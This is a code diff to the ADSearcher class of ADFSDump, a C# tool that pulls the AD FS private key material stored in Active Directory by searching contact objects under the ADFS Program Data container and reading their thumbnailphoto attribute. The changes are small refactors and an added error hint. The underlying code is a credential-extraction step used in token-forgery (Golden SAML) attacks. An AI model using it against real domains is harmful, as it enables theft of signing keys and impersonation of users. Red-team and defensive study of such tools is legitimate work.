@@ -8,7 +8,7 @@ namespace ADFSDump.ActiveDirectory
 {
     public static class ADSearcher
     {
-        private const string _ldapFilter = "(&(objectClass=contact)(!(cn=CryptoPolicy)))";
+        private const string LdapFilter = "(&(objectClass=contact)(!(cn=CryptoPolicy)))";
 
         public static void GetPrivKey(Dictionary<string,string> arguments)
         {
@@ -38,15 +38,15 @@ namespace ADFSDump.ActiveDirectory
             }
 
             Console.WriteLine("## Extracting Private Key from Active Directory Store");
-            Console.WriteLine(string.Format("[-] Domain is {0}", domain));
+            Console.WriteLine($"[-] Domain is {domain}");
             string[] domainParts = domain.Split('.');
             List<String> searchBase = new List<String>{ "CN=ADFS", "CN=Microsoft", "CN=Program Data" };
             foreach( string part in domainParts)
             {
-                searchBase.Add(string.Format("DC={0}", part));
+                searchBase.Add($"DC={part}");
             }
 
-            string ldap = String.Format("{0}{1}", searchString, string.Join(",", searchBase.ToArray()));
+            string ldap = $"{searchString}{string.Join(",", searchBase.ToArray())}";
 
             try
             {
@@ -54,7 +54,7 @@ namespace ADFSDump.ActiveDirectory
                 {
                     using (DirectorySearcher mySearcher = new DirectorySearcher(entry))
                     {
-                        mySearcher.Filter = (_ldapFilter);
+                        mySearcher.Filter = (LdapFilter);
                         mySearcher.PropertiesToLoad.Add("thumbnailphoto");
                         foreach (SearchResult resEnt in mySearcher.FindAll())
                         {
@@ -69,6 +69,7 @@ namespace ADFSDump.ActiveDirectory
             catch (Exception e)
             {
                 Console.WriteLine("!!! Exception getting private key: {0}", e);
+                Console.WriteLine("!!! Are you sure you are running as the AD FS service account?");
             }
         }
     }
